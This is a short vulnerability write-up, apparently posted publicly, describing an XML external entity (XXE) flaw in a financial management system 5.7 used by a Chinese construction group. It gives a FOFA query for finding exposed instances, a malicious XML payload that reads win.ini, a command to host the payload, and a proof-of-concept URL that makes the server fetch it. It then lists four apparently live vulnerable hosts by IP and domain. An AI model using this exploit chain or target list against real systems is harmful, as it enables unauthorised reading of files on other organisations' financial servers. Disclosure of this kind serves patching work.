# There is xml external entity injection in UF Corps Construction Group Financial Management System 5.7



UFIDA Construction Engineering Group Financial Management System 5.7 has arbitrary file reading caused by xml external entity injection.



FOFA：`title=="兵团建工集团财务管理系统5.7"`



Create a `2.xml` file on the server and write the following content:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]>
<user>
        <username>&name;</username>
        <password>1</password>
</user>
```

(If it is a Linux system, just change the file:/// parameter yourself)



After creation, start the http service:

```shell
python3 -m http.server 9999
```

The server IP used during testing is: 8.219.253.99



POC：

```
/uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://8.219.253.99:9999/2.xml
```





Case1：http://60.13.174.210:7080/

![image-20240311112218011](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112218011.png)

![image-20240311112242703](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112242703.png)



Case2：http://117.146.57.215:7080/

![image-20240311112306012](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112306012.png)

![image-20240311112322561](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112322561.png)



Case3：http://nmcbrouter.xbjg.com:7080/

![image-20240311112355470](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112355470.png)

![image-20240311112412632](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112412632.png)



Case4：http://nlhkxrrdhl.xbjg.com:7080/

![image-20240311112450690](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112450690.png)

![image-20240311112509886](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20240311112509886.png)